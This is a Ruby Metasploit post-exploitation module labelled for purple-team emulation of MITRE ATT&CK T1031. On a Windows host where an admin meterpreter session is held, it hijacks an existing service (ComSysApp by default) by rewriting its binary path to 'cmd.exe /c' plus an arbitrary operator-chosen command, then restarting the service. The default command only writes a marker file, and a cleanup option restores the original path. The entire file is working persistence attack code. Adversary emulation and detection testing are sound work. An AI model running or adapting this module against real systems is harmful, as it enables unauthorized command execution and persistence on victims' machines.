##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


class MetasploitModule < Msf::Post

  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Accounts
  include Msf::Post::Windows::Services

  def initialize(info={})
    super(update_info(info,
                      'Name'          => 'Modify Existing Service (T1031) Windows - Purple Team',
                      'Description'   => %q{
                        Persistence:
                        Windows service configuration information, including the
                        file path to the service's executable, is stored in the Registry. Service
                        configurations can be modified using utilities such as sc.exe and Reg.
                                            },
                      'License'       => MSF_LICENSE,
                      'Author'        => [ 'Praetorian' ],
                      'Platform'      => [ 'win' ],
                      'References'    => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1031' ] ],
                      'SessionTypes'  => [ 'meterpreter' ]
                     ))
    register_options(
    [
      OptString.new("SERVICE", [ true, "Target service to be modified.", "ComSysApp"]),
      OptString.new("COMMAND", [true, "Command to execute with CMD.", "echo T1031 > C:\\t1031.txt && whoami >> C:\\t1031.txt && date /t >> C:\\t1031.txt && time /t >> C:\\t1031.txt"]),
      OptBool.new("CLEANUP", [true, "Restore service paramters after execution.", true])
    ])

  end

  DEFAULT_SVC_BINPATH = "C:\\Windows\\system32\\dllhost.exe /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235}"

  def run
    begin
      raise "Module requires meterpreter session" unless session.type == "meterpreter"
      fail_with(Failure::NoAccess, "The current session does not have administrative rights.") unless is_admin?

      # save the old path
      # handle the case where we ran without cleanup (only works for default "Fax" service)
      old_binpath = service_info(datastore['SERVICE'])[:path]
      unless (old_binpath.include? "dllhost") and datastore['SERVICE'] == "ComSysApp"
          old_binpath = DEFAULT_SVC_BINPATH
      end

      # do persistence
      # stop the service if it is running, modify the binpath, then start it again
      print_status("Stopping service '#{datastore['SERVICE']}'.")
      raise "Failed stopping service." unless service_stop(datastore['SERVICE']) != 2
      print_status("Modifying service binary path.")
      raise "Failed to change binary path." unless service_change_config(datastore['SERVICE'], {:path => "C:\\Windows\\System32\\cmd.exe /c #{datastore["COMMAND"]}"}) == 0
      print_status("Starting service...")
      service_start(datastore['SERVICE'])

      if datastore['CLEANUP']
        # stop the service, reset the binpath
        print_status("Cleaning up...\nStopping Service.")
        service_stop(datastore['SERVICE'])
        print_status("Resetting binpath to #{old_binpath}")
        service_change_config(datastore['SERVICE'], {:path => "#{old_binpath}"})
      end

      print_good("Module T1031W execution successful.")

    rescue ::Exception => e
      print_error("#{e.class}: #{e.message}")
      print_error("Module T1013W execution failed.")
    end
  end
end
